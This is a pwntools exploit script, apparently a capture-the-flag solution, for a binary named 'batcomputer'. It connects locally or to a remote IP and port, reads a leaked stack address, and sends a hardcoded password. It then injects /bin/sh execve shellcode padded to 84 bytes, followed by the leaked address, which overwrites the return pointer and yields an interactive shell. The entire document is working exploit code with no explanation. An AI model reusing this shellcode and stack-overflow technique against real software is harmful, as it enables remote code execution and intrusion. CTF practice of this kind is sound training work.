from pwn import *

gs = '''
continue
'''

elf = context.binary = ELF("./batcomputer")

context.arch = "amd64"

def start():
    if args.REMOTE:
        return remote("83.136.253.228", 59215)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']
io = start()

io.sendlineafter("> ", b"1")

io.recvuntil("him: ")

stack_address = int(io.recvline().strip().decode(), 16)

io.sendlineafter("> ", b"2")

io.sendlineafter("password: ", b'b4tp@$$w0rd!\x00')

print("Stack Address:", hex(stack_address))

# Fuentes: https://systemoverlord.com/2016/04/27/even-shorter-shellcode.html
shellcode = b"\x31\xF6\x56\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\xF7\xEE\xB0\x3B\x0F\x05"

payload = b"".join([
    shellcode.ljust(84, b"\x00"),
    p64(stack_address)
])

io.sendlineafter("commands: ", payload)

io.sendlineafter("> ", b"3")

io.interactive()
